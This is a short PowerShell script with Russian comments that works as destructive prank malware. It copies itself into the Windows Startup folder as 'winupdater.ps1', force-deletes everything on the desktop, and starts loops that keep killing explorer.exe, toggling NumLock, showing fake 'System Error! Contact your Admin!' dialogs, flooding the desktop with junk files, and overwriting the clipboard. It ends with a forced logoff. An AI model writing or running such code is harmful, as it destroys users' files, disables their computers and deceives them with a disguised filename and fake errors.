# Добавление в автозагрузку
$autostart = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.ps1"
if (-not (Test-Path $autostart)) {
    Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $autostart
}

# Удалить всё с рабочего стола
Remove-Item "$env:USERPROFILE\Desktop\*" -Recurse -Force -ErrorAction SilentlyContinue

# Переименовать папки на рабочем столе
Get-ChildItem "$env:USERPROFILE\Desktop" -Directory | ForEach-Object {
    Rename-Item $_.FullName -NewName "LOL_$([System.Guid]::NewGuid().ToString().Substring(0, 5))"
}

# Создать копии файлов на рабочем столе
Get-ChildItem "$env:USERPROFILE\Desktop" -File | ForEach-Object {
    Copy-Item $_.FullName -Destination "$($_.DirectoryName)\$($_.BaseName)_COPY$($_.Extension)"
}

# Перевернуть экран
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^{%DOWN}')

# Фоновые задачи запускаем отдельно:

# Бесконечно завершать explorer.exe
Start-Job -ScriptBlock {
    while ($true) {
        taskkill /f /im explorer.exe
        Start-Sleep -Seconds 5
    }
}

# Блокировка клавиатуры через NumLock
Start-Job -ScriptBlock {
    $wsh = New-Object -ComObject WScript.Shell
    while($true){
        $wsh.SendKeys('{NUMLOCK}')
        Start-Sleep -Milliseconds 100
    }
}

# Создание бесконечно вложенных папок
Start-Job -ScriptBlock {
    $path = "$env:USERPROFILE\Desktop\maze"
    for($i=0;$i -lt 100;$i++){
        $path += "\$i"
        New-Item -Path $path -ItemType Directory -Force | Out-Null
    }
}

# Спам сообщениями через MessageBox
Add-Type -AssemblyName PresentationFramework
Start-Job -ScriptBlock {
    while($true){
        [System.Windows.MessageBox]::Show('System Error! Contact your Admin!','Critical Error','OK','Error') | Out-Null
        Start-Sleep -Milliseconds 500
    }
}

# Засорение рабочего стола мусорными файлами
Start-Job -ScriptBlock {
    for($i=0;$i -lt 500;$i++){
        New-Item "$env:USERPROFILE\Desktop\garbage_$i.txt" -Value "LOL" | Out-Null
    }
}

# Заполнение буфера обмена мусором
Start-Job -ScriptBlock {
    while($true){
        Set-Clipboard -Value ('HAHAHA'*(Get-Random -Minimum 100 -Maximum 1000))
        Start-Sleep -Milliseconds 100
    }
}

# Даем фоновым задачам поработать
Start-Sleep -Seconds 300

# Выход из системы (в самом конце)
shutdown /l /f
